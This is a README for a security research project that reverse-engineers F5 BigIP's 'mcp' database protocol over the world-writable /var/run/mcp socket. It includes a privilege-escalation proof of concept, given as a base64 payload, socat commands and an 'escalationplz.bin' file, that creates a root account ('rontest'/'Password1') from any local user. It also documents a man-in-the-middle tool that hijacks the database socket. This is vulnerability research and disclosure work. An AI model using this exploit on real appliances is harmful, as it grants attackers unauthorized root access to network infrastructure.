This isn't really done or ready yet, but I wanted to get the code checked in.

This basically implements F5's database protocol, "mcp", which operates through
a UNIX domain socket.

# What is mcp?

MCP is a proprietary (AFAICT) database used by F5 BigIP. It's accessed through
`/var/run/mcp`, a UNIX domain socket with 0777 permissions (ie, any user can
access it).

The protocol is TLV-style, which a whole bunch of types (over 41,000). They're
all listed in [mcp-objects.txt](/mcp-objects.txt).

I implemented a parser that you can find in [mcp-parser.rb](/mcp-parser.rb),
and you can find a bunch of different messages in
[mcp-parser-tests.rb](/mcp-parser-tests.rb).

I also created a builder, [mcp-builder.rb](/mcp-builder.rb), although it's not
really designed to be easy to use. We do have a pre-defined function that
creates an MCP packet that creates a root-level user account, which is pretty
cool.

# Building and Sending MCP Messages

To communicate with MCP directly, you'll generally use `socat`. For example,
we can use `mcp-builder.rb` to create a message (using `gzip` + `base64` for
easier demos):

```
$ ruby mcp-builder.rb | gzip - | base64 -w0
H4sIAAAAAAAAA2NgYBBnQAICGgy8QIpfQJOBH0izM7AmpuRm5oFkkJVx54CVcajaMbBChSxQ5KPA8gYCLGBaQ4ANbBwnA3tRfl5JanGJADtEowAHzJ5ox5ycWCDzBBZzDnALgukd3EJo5sifBAtwMLA55+fm5ucJxkPM5ZYEi3MzcOonZebpJyUWZ3CLgKUYuYXBUjkMWSpmKkVJJWZ5ocFB7s5VnlX5PhEqRUZ5vhk5RqY+5iZ5pUYm2aVJjvlVJYXBbklpiSlJZWaFeSmeeqa5roVRufph+oX6JXluejlB7pWpTnlZAcVFju4V5gbOKWnFZa76pZXhSb5uBYUFJfpgJyL7Kw/sHwYAd5yKZH8BAAA=
```

Then, on the host with `/var/run/mcp`, use socat to connect and save the
response again as base64 (note: this can be any user account, since the socket
is 0777):

```
# echo -ne 'H4[...]A=' | base64 -d | gunzip - | socat -t100 - UNIX-CONNECT:/var/run/mcp | base64 -w0
AAAAHgAAAAAAAAAAAAAAAAtUAA0AAAAWC1UABQAAAAALVwAMECgLWAAMECkAAAAAAB4AAAAAAAAAAAAAAAALVAANAAAAFgtVAAUAAAAAC1cADAtaC1gADAsRAAA=
```

And finally, we can parse that response:

```
$ echo -ne 'AAAAHgAAAAAAAAAAAAAAAAtUAA0AAAAWC1UABQAAAAALVwAMECgLWAAMECkAAAAAAB4AAAAAAAAAAAAAAAALVAANAAAAFgtVAAUAAAAAC1cADAtaC1gADAsRAAA=' | base64 -d | ruby ./mcp-parser.rb 
result (structure [22 bytes]):
 result_code (ulong) = 0x00000000 (0)
 result_operation (tag) = user_authenticated
 result_type (tag) = user_authenticated_name
result (structure [22 bytes]):
 result_code (ulong) = 0x00000000 (0)
 result_operation (tag) = create
 result_type (tag) = userdb_entry
```

You can, of course, do it all as a single command:

```
$ ruby mcp-builder.rb | ssh root@10.0.0.136 socat -t100 - UNIX-CONNECT:/var/run/mcp | ruby ./mcp-parser.rb 
result (structure [22 bytes]):
 result_code (ulong) = 0x00000000 (0)
 result_operation (tag) = user_authenticated
 result_type (tag) = user_authenticated_name
result (structure [96 bytes]):
 result_code (ulong) = 0x01020066 (16908390)
 result_message (string [78 bytes]) = "01020066:3: The requested user (rontest) already exists in partition Common."
```

## Privesc

As of this writing, `/var/run/mcp` is world-writable and therefore any user can
write to it! That means any user can add root users, which is a great thing to
do after exploiting a service and getting a non-root shell.

You can edit `mcp-builder.rb` to create whatever account you want, using
sha512crypt-style password hashes:

```
  create_root_account_plz("username", '$6$hashedpassword')
```

Then send the output from that into `/var/run/mcp` and it should create you an
account.

If you just run the PoC (or use `escalationplz.bin`), you'll get a new user with
the username `rontest` and the password `Password1`:

```
socat -t100 - UNIX-CONNECT:/var/run/mcp < escalationplz.bin
```

# Man in the Middle Inspection

I also wrote a tool to inspect database queries - [mcp-mitm.rb](/mcp-mitm.rb).
This isn't an exploit, it's just an analysis tool.

To run it:

* Ensure the server isn't being used for anything important - this is somewhere between "destructive" and "interrupty" because we yoink the database socket (it does try to fix it after!)
* Ensure the F5 Big-IP host can connect back to you on any two ports (1234 and 1235 by default)
* Ensure you can `ssh root@<target>` with no password or other input (or edit the code and turn off `DO_SETUP`)

Pretty much any potential "damage" is fixed with a reboot, since it creates the
socket at boot, but you probably don't wanna do that on prod.

Anyway, execute with no args to get the usage, then fill in the important IP
addresses:

```
$ ruby ./mcp-mitm.rb
Usage: ruby ./mcp-mitm.rb <your ip> <target ip> [listen port 1] [listen port 2]
[...]

$ ruby ./mcp-mitm.rb 10.0.0.179 10.0.0.162

$ ruby ./mcp-mitm.rb 10.0.0.179 10.0.0.162
Configuration (edit the script to change, this is a PoC!):

Your IP: 10.0.0.179
Target IP: 10.0.0.162
Listening port 1: 1234
Listening port 2: 1235
SSH into the target to set things up: true
  (Make sure you can ssh into the host as root with no password)
  (Yes yes, I know it's a PoC!)
SSH'ing into the server to set things up
Ready!
```

If you wait around (or do stuff on the server), you'll see sessions:

```
Received session @ #<TCPSocket:0x000000000170d630> <--> #<TCPSocket:0x000000000170d658>

user_authenticated (structure [15 bytes]):
 user_authenticated_name (string [7 bytes]) = "admin"

start_transaction (structure [8 bytes]):
 start_transaction_load_type (ulong) = 0x00000000 (0)
[...]
```

Ctrl-c will stop it, and fix the socket:

```
^CSSH'ing into the server to fix things
Session 1 closed?
Ending thread
Ending thread
Traceback (most recent call last):
        3: from ./mcp-mitm.rb:149:in `<main>'
        2: from ./mcp-mitm.rb:149:in `loop'
        1: from ./mcp-mitm.rb:151:in `block in <main>'
./mcp-mitm.rb:151:in `accept': Interrupt
```

And that's it!
